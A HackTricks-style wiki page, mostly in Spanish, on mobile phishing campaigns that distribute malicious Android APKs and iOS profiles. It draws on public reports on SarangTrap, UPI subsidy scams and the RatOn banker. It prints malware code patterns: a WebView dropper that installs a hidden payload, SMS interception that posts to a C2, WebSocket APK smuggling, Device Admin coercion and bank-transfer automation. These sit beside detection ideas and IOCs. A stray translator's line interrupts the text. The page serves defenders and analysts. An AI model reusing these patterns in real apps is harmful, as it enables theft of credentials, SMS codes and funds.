# Phishing móvil y distribución de apps maliciosas (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Esta página cubre técnicas usadas por actores de amenaza para distribuir **malicious Android APKs** y **iOS mobile-configuration profiles** mediante phishing (SEO, ingeniería social, tiendas falsas, apps de citas, etc.).
> El material está adaptado de la campaña SarangTrap expuesta por Zimperium zLabs (2025) y otras investigaciones públicas.

## Flujo del ataque

1. **SEO/Infraestructura de phishing**
* Registrar docenas de dominios look-alike (sitios de citas, compartición en la nube, servicio de coches…).
– Usar palabras clave en el idioma local y emojis en el elemento `<title>` para posicionarse en Google.
– Alojar *tanto* instrucciones de instalación para Android (`.apk`) como para iOS en la misma landing page.
2. **Descarga de primera etapa**
* Android: enlace directo a un APK *unsigned* o de “third-party store”.
* iOS: `itms-services://` o enlace HTTPS simple a un **mobileconfig** profile malicioso (ver más abajo).
3. **Ingeniería social post-instalación**
* Al primer arranque la app pide un **invitation / verification code** (ilusión de acceso exclusivo).
* El código es **POSTed over HTTP** al Command-and-Control (C2).
* C2 responde `{"success":true}` ➜ el malware continúa.
* Un análisis dinámico de Sandbox / AV que nunca envía un código válido no detecta **no malicious behaviour** (evasión).
4. **Abuso de permisos en tiempo de ejecución (Android)**
* Los permisos peligrosos sólo se solicitan **después de una respuesta positiva del C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Variantes recientes **remove `<uses-permission>` for SMS from `AndroidManifest.xml`** pero mantienen la ruta de código Java/Kotlin que lee SMS mediante reflection ⇒ reduce la puntuación estática mientras sigue funcional en dispositivos que otorgan el permiso vía `AppOps` abuse o en objetivos antiguos.
5. **Interfaz fachada y recolección en segundo plano**
* La app muestra vistas inofensivas (SMS viewer, gallery picker) implementadas localmente.
* Mientras tanto exfiltra:
- IMEI / IMSI, número de teléfono
- Volcado completo de `ContactsContract` (arreglo JSON)
- JPEG/PNG de `/sdcard/DCIM` comprimidos con [Luban](https://github.com/Curzibn/Luban) para reducir tamaño
- Contenido SMS opcional (`content://sms`)
Payloads se **batch-zipped** y envían vía `HTTP POST /upload.php`.
6. **Técnica de entrega en iOS**
* Un único **mobile-configuration profile** puede solicitar `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. para inscribir el dispositivo en una supervisión similar a “MDM”.
* Instrucciones de ingeniería social:
1. Open Settings ➜ *Profile downloaded*.
2. Tap *Install* three times (capturas en la página de phishing).
3. Trust the unsigned profile ➜ el atacante obtiene el entitlement *Contacts* & *Photo* sin revisión de App Store.
7. **Capa de red**
* HTTP sin TLS, a menudo en el puerto 80 con HOST header como `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → fácil de detectar).

## Pruebas defensivas / Consejos para Red Team

* **Dynamic Analysis Bypass** – Durante la evaluación del malware, automatizar la fase del invitation code con Frida/Objection para alcanzar la rama maliciosa.
* **Manifest vs. Runtime Diff** – Comparar `aapt dump permissions` con el runtime `PackageManager#getRequestedPermissions()`; la ausencia de permisos peligrosos es una señal de alarma.
* **Network Canary** – Configure `iptables -p tcp --dport 80 -j NFQUEUE` para detectar ráfagas no sólidas de POST tras la entrada del código.
* **mobileconfig Inspection** – Use `security cms -D -i profile.mobileconfig` en macOS para listar `PayloadContent` y detectar entitlements excesivos.

## Ideas de detección para Blue Team

* **Certificate Transparency / DNS Analytics** para detectar ráfagas súbitas de dominios ricos en palabras clave.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` desde clientes Dalvik fuera de Google Play.
* **Invite-code Telemetry** – El POST de códigos numéricos de 6–8 dígitos poco después de la instalación del APK puede indicar staging.
* **MobileConfig Signing** – Bloquear perfiles de configuración no firmados vía política MDM.

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Indicadores (Genéricos)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Este patrón se ha observado en campañas que abusan de temas de beneficios gubernamentales para robar credenciales UPI indias y OTPs. Los operadores encadenan plataformas reputadas para la entrega y la resiliencia.

### Cadena de entrega a través de plataformas de confianza
- Señuelo en video de YouTube → la descripción contiene un enlace corto
- Enlace corto → sitio de phishing en GitHub Pages que imita el portal legítimo
- El mismo repo de GitHub aloja un APK con una insignia falsa de “Google Play” que enlaza directamente al archivo
- Páginas de phishing dinámicas alojadas en Replit; el canal remoto de comandos usa Firebase Cloud Messaging (FCM)

### Dropper con payload incrustado e instalación offline
- El primer APK es un installer (dropper) que incluye el malware real en `assets/app.apk` y solicita al usuario desactivar Wi‑Fi/datos móviles para reducir la detección en la nube.
- El payload incrustado se instala bajo una etiqueta inocua (p. ej., “Secure Update”). Tras la instalación, tanto el installer como el payload están presentes como apps separadas.

Consejo de triage estático (grep para payloads incrustados):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Descubrimiento dinámico de endpoints vía shortlink
- Malware recupera una lista en texto plano, separada por comas, de endpoints activos desde un shortlink; transformaciones simples de cadenas generan la ruta final de la página de phishing.

Ejemplo (sanitizado):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudocódigo:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Recolección de credenciales UPI basada en WebView
- El paso “Hacer un pago de ₹1 / UPI‑Lite” carga un formulario HTML del atacante desde un endpoint dinámico dentro de un WebView y captura campos sensibles (teléfono, banco, UPI PIN) que son enviados mediante `POST` a `addup.php`.

Cargador mínimo:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Autopropagación y SMS/OTP interception
- Se solicitan permisos agresivos en la primera ejecución:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Los contactos se recorren para enviar masivamente mensajes smishing desde el dispositivo de la víctima.
- Los SMS entrantes son interceptados por un broadcast receiver y subidos con metadatos (remitente, cuerpo, ranura SIM, ID aleatorio por dispositivo) a `/addsm.php`.

Esquema del broadcast receiver:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) como C2 resiliente
- El payload se registra en FCM; los mensajes push llevan un campo `_type` usado como interruptor para activar acciones (p. ej., actualizar plantillas de texto de phishing, alternar comportamientos).

Ejemplo de payload de FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Esquema del Handler:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Hunting patterns and IOCs
- APK contains secondary payload at `assets/app.apk`
- WebView loads payment from `gate.htm` and exfiltrates to `/addup.php`
- SMS exfiltration to `/addsm.php`
- Shortlink-driven config fetch (e.g., `rebrand.ly/*`) returning CSV endpoints
- Apps labelled as generic “Update/Secure Update”
- FCM `data` messages with a `_type` discriminator in untrusted apps

### Ideas de detección y defensa
- Marcar apps que instruyen a los usuarios a desactivar la red durante la instalación y luego side-load un segundo APK desde `assets/`.
- Alertar sobre la tupla de permisos: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + flujos de pago basados en WebView.
- Monitorización de egress para `POST /addup.php|/addsm.php` en hosts no corporativos; bloquear infraestructura conocida.
- Reglas Mobile EDR: app no confiable registrándose en FCM y ramificándose según un campo `_type`.

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers increasingly replace static APK links with a Socket.IO/WebSocket channel embedded in Google Play–looking lures. This conceals the payload URL, bypasses URL/extension filters, and preserves a realistic install UX.

Typical client flow observed in the wild:
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
Por qué evade controles simples:
- No se expone una URL estática de APK; la payload se reconstruye en memoria a partir de frames de WebSocket.
- Los filtros de URL/MIME/extensión que bloquean respuestas .apk directas pueden pasar por alto datos binarios tunelizados vía WebSockets/Socket.IO.
- Los crawlers y sandboxes de URLs que no ejecutan WebSockets no recuperarán la payload.

Hunting y ideas de detección:
- Telemetría web/red: marcar sesiones de WebSocket que transfieran grandes bloques binarios seguidas de la creación de un Blob con MIME application/vnd.android.package-archive y un clic programático en `<a download>`. Buscar cadenas de cliente como socket.emit('startDownload'), y eventos nombrados chunk, downloadProgress, downloadComplete en los scripts de la página.
- Heurísticas de suplantación Play-store: en dominios no-Google que sirven páginas tipo Play, buscar cadenas de UI de Google Play como http.html:"VfPpkd-jY41G-V67aGc", plantillas con idiomas mixtos, y flujos falsos de “verification/progress” impulsados por WS events.
- Controles: bloquear la entrega de APK desde orígenes no-Google; hacer cumplir políticas de MIME/extensión que incluyan tráfico de WebSocket; preservar los avisos de descarga segura del navegador.

Véase también WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – Estudio de caso RatOn

La campaña RatOn banker/RAT (ThreatFabric) es un ejemplo concreto de cómo las operaciones modernas de mobile phishing combinan WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, e incluso NFC-relay orchestration. Esta sección abstrae las técnicas reutilizables.

### Etapa 1: WebView → puente de instalación nativa (dropper)
Los atacantes presentan un WebView que apunta a una página atacante e inyectan una interfaz JavaScript que expone un instalador nativo. Un toque en un botón HTML llama al código nativo que instala un APK de segunda etapa incluido en los assets del dropper y luego lo lanza directamente.

Patrón mínimo:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
Por favor pega aquí el HTML o el contenido Markdown de la página que quieres que traduzca al español. Preservaré exactamente las etiquetas, enlaces, rutas y fragmentos de código según tus instrucciones.
```html
<button onclick="bridge.installApk()">Install</button>
```
Después de la instalación, el dropper inicia el payload mediante paquete/actividad explícita:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Idea de hunting: aplicaciones no confiables que llaman a `addJavascriptInterface()` y exponen métodos similares al instalador a WebView; APK que incluye una carga útil secundaria embebida bajo `assets/` e invoca la Package Installer Session API.

### Embudo de consentimiento: Accessibility + Device Admin + solicitudes de permisos en tiempo de ejecución posteriores
Stage-2 abre un WebView que aloja una página “Access”. Su botón invoca un método exportado que navega a la víctima a los ajustes de Accessibility y solicita habilitar el servicio malicioso. Una vez concedido, el malware usa Accessibility para hacer clic automáticamente a través de los diálogos de permisos posteriores en tiempo de ejecución (contacts, overlay, manage system settings, etc.) y solicita Device Admin.

- Accessibility programáticamente ayuda a aceptar solicitudes posteriores encontrando botones como “Allow”/“OK” en el árbol de nodos y simulando clics.
- Comprobación/solicitud de permiso Overlay:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Véase también:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Los operadores pueden emitir comandos para:
- renderizar una superposición a pantalla completa desde una URL, o
- pasar HTML en línea que se carga en una superposición WebView.

Usos probables: coerción (introducción de PIN), apertura de wallet para capturar PINs, mensajes de rescate. Mantener un comando para asegurar que el permiso de superposición esté concedido si falta.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: volcar periódicamente el Accessibility node tree, serializar los textos/roles/bounds visibles y enviarlos al C2 como una pseudo-pantalla (comandos como `txt_screen` para una vez y `screen_live` continuo).
- High-fidelity: solicitar MediaProjection e iniciar screen-casting/recording bajo demanda (comandos como `display` / `record`).

### ATS playbook (bank app automation)
Dada una tarea JSON, abrir la app bancaria, controlar la UI vía Accessibility con una mezcla de consultas de texto y toques por coordenadas, y escribir el PIN de pago de la víctima cuando se solicite.

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "Nuevo pago"
- "Zadat platbu" → "Ingresar pago"
- "Nový příjemce" → "Nuevo beneficiario"
- "Domácí číslo účtu" → "Número de cuenta doméstica"
- "Další" → "Siguiente"
- "Odeslat" → "Enviar"
- "Ano, pokračovat" → "Sí, continuar"
- "Zaplatit" → "Pagar"
- "Hotovo" → "Hecho"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.

### Extracción de seed phrase de wallets de criptomonedas
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: unlock (stolen PIN or provided password), navigate to Seguridad/Recuperación, reveal/show seed phrase, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) to stabilise navigation across languages.

### Coerción de Device Admin
Device Admin APIs are used to increase PIN-capture opportunities and frustrate the victim:

- Bloqueo inmediato:
```java
dpm.lockNow();
```
- Expirar la credencial actual para forzar el cambio (Accessibility captura el nuevo PIN/contraseña):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Forzar desbloqueo no biométrico deshabilitando las funciones biométricas de keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Nota: Muchos controles de DevicePolicyManager requieren Device Owner/Profile Owner en versiones recientes de Android; algunas builds de OEM pueden ser laxas. Valida siempre en el OS/OEM objetivo.

### NFC relay orchestration (NFSkate)
Stage-3 puede instalar y lanzar un módulo externo de NFC-relay (por ejemplo, NFSkate) e incluso pasarle una plantilla HTML para guiar a la víctima durante el relay. Esto posibilita cash-out contactless con card-present junto con ATS online.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Detection & defence ideas (RatOn-style)
- Busca WebViews con `addJavascriptInterface()` que expongan métodos de instalador/permiso; páginas que terminen en “/access” que disparen prompts de Accessibility.
- Alertar sobre apps que generen gestos/clicks de Accessibility a alta tasa poco después de obtener acceso al servicio; telemetría que se parezca a dumps de Accessibility nodes enviados al C2.
- Monitorizar cambios de políticas de Device Admin en apps no confiables: `lockNow`, expiración de contraseña, toggles de features de keyguard.
- Alertar sobre prompts de MediaProjection desde apps no corporativas seguidos de subidas periódicas de frames.
- Detectar la instalación/lanzamiento de una app de NFC-relay externa disparada por otra app.
- Para banca: imponer confirmaciones out-of-band, vinculación biométrica y límites de transacción resistentes a la automatización en el dispositivo.

## References

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
